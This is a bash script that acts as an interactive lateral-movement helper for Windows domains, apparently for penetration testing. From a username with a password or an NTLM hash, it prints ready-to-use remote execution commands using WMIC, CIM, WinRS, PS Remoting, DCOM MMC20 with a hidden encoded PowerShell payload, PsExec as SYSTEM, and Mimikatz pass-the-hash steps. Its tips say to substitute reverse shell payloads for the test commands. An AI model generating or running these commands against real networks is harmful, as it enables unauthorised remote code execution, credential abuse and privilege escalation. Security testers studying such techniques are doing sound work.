#!/bin/bash
line="\n============================================================\n"

Creds()
{
	echo -e "\nEnter the target account's username without the Hostname (e.g. bob):\n"
	read user

	echo -e "\nEnter the target account's password:\n"
	read passwd
}

echo -e "$line\n[!] Tip: When pivoting between hosts in the same subnet, you can often use the target's IP Address & their Hostname interchangeably.\n"
echo -e "HOWEVER, this isn't always the case (i.e. When using Sysinternals PSExec without passing credentials). If you're having trouble connecting with one of these, try using the other."

echo -e "$line\nSelect a technique:\n[1] WMI\n[2] WinRM (WinRS & PS Remoting)\n[3] DCOM\n[4] PSExec (Sysinternals)\n"
read mode

if [ $mode == 1 ]
then
	echo -e "\nSpecify the target's IP Address\n"
	read target
	Creds

	echo -e "$line\n[!] Tip: There are 2 methods for RCE using WMI: WMIC & Powershell. WMIC is deprecated, but it may still be enabled for backwards compatibility\n"
	echo -e "[!] Tip: These test payloads just launch the Calculator App. If they work, it'll output the PID & ReturnValue 0.\n"
	echo -e "[+] After the test, substitute the calc command for a Reverse shell payload (e.g. \$Command = 'powershell -nop -w hidden -e...)\n$line\nWMIC Test Payload:\n"

	echo "wmic /node:$target /user:$user /password:$passwd process call create \"calc\""

	echo -e "$line\nPowershell Test Payload:\n"

	echo "\$username = '$user';"
	echo "\$password = '$passwd';"
	echo "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;"
	echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;"
	echo "\$Options = New-CimSessionOption -Protocol DCOM"
	echo "\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options"
	echo "\$Command = 'calc';"
	echo "Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command};"

elif [ $mode == 2 ]
then 
	echo -e "$line\nSpecify the target's Hostname for WinRS or its IP Address for PS Remoting:\n"
	read target
	Creds

	echo -e "\nWinRS Test Payload:\n[!] Tip: If this test works, substitute the commands for a Reverse shell payload\n\n"

	echo "winrs -r:$target -u:$user -p:$passwd \"cmd /c hostname & whoami\""

	echo -e "$line\nBasic PS Remoting:\n[!] Tip: Based off of output from New-PSSession, you may need to use a differnt ID number for Enter-PSSession\n\n"

	echo "\$username = '$user';"
	echo "\$password = '$passwd';"
	echo "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;"
	echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;"
	echo "New-PSSession -ComputerName $target -Credential \$credential"
	echo "Enter-PSSession 1"

#Is there a way to check for Special Configuration Names for PS Remoting before getting RCE, so you can use that to connect?

elif [ $mode == 3 ]
then
	echo -e "\nEnter the target's IP Address:\n"
	read target

	echo -e "$line\n[!] Tip: This DCOM method requires that your CURRENT user is a Local Admin on the current machine & the target machine\n"
	echo -e "\n[!] Tip: You must run the following commands inside an Admin Powershell terminal (i.e. R Click & Run as Admin)\n"

	echo "\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"$target\"))"
	echo "\$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",\$null,\"powershell -nop -w hidden -e ENCODED_PAYLOAD\",\"7\")"


elif [ $mode == 4 ]
then

#Add option to output cmds for Mimikatz & Rubeus for PtH & PtT

	echo -e "\n[!] Tip: PSExec can be uploaded to the target & doesn't need to be installed.\n"
	echo -e "[!] Tip: If you don't supply credentials, you'll authenticate as the current user. Ergo, you can OPtH or PtT (Kerberos) by combining it with a tool like Mimikatz."
	echo -e "\nSelect an option:\n[1] Use a Password\n[2] Use an NTLM Hash (OPtH Attack)\n"
	read opt

	if [ "$opt" == 1 ]
	then
		echo -e "\nEnter the target's IP Address:\n"
		read target
		echo -e "\nEnter the Domain (e.g.for xample.com, use xample):\n"
		read dom
		Creds

		echo -e "$line\nInteractive Session as User:\n"
		echo ".\\PsExec.exe -accepteula -i \\\\$target -u $dom\\$user -p $passwd powershell"

		echo -e "\nInteractive Session as SYSTEM:\n"
		echo ".\\PsExec.exe -accepteula -s \\\\$target -u $dom\\$user -p $passwd powershell"
	
	elif [ "$opt" == 2 ]
	then
		echo -e "\nEnter the target's Hostname for an OPtH Attack (NOT the IP Address):\n"
		read target
		echo -e "$line\n[Setup]\n\n1) Launch an Admin Powershell terminal & start Mimikatz\n2) privilege::debug\n"
		echo -e "\nEnter the target account's username:\n"
		read user
		echo -e "\nEnter the Domain name (e.g. xample.com):\n"
		read dom
		echo -e "\nEnter the target account's NTLM Hash:\n"
		read ntlm

		echo -e "$line\n[PtH]\n\nsekurlsa::pth /user:$user /domain:$dom /ntlm:$ntlm /run:powershell\n"

		echo -e "$line\n[OPtH]\nRequest a TGT using the new Powershell session (e.g. authenticate to an SMB Share)\n"
		echo "net use \\\\$target"
		echo "klist"

		echo -e "$line\nInteractive Session as User:\n"
                echo ".\\PsExec.exe -accepteula \\\\$target powershell"

                echo -e "\nInteractive Session as SYSTEM:\n"
                echo ".\\PsExec.exe -accepteula -s \\\\$target powershell"

	else
		echo -e "\nYou did not select a valid option\n"
        	exit
	fi

else
	echo -e "\nYou did not select a valid option\n"
        exit
fi

echo -e "$line"
